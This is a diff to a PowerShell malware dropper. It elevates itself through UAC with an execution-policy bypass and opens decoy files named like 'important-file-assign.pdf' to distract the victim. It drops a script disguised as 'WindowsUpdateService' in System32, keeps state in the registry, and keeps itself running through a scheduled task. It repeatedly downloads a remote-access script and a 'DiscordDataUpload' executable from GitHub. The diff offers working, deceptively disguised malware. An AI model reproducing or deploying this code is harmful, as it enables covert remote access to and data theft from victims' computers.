@@ -1,13 +1,32 @@
-#Script starts here.
+#Admin Check and execution bypass.
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+if (-not $isAdmin) {
+    Write-Host "Script is not running with administrative privileges. Prompting for UAC elevation..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+#Variables
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-#Write-Host "Processing Your Downloaded File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
+$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
+$searchPattern = "*assign*.*"
+$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File
+
+#Opening the file, name should contain "assign", such as important-file-assign.pdf/docx etc.
+if ($matchingFiles.Count -gt 0) {
+  foreach ($file in $matchingFiles) {
+      # Open each matching file with the default associated program
+      Invoke-Item -Path $file.FullName
+  }
+}
 
 # Check if the registry path exists, create it if not
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
 }
+
 # Check for existing "Code" value
 $existingCode = (Get-ItemProperty -Path $regPath -Name "Code" -ErrorAction SilentlyContinue).Code
 
@@ -28,10 +47,10 @@ if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data"
     Set-ItemProperty -Path $regPath -Name "Data" -Value "active" -ErrorAction SilentlyContinue
 }
 
-
 #Install WindowsUpdateService
 $scriptContent = @'
 while ($true) {
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
   $accessurl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
   $boturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
   $accessresponse = Invoke-WebRequest -Uri $accessurl -UseBasicParsing -ErrorAction SilentlyContinue
@@ -124,6 +143,6 @@ if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
 }
 else {}
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
-
 Start-Sleep 10
 Start-ScheduledTask -TaskName $updateserv
+
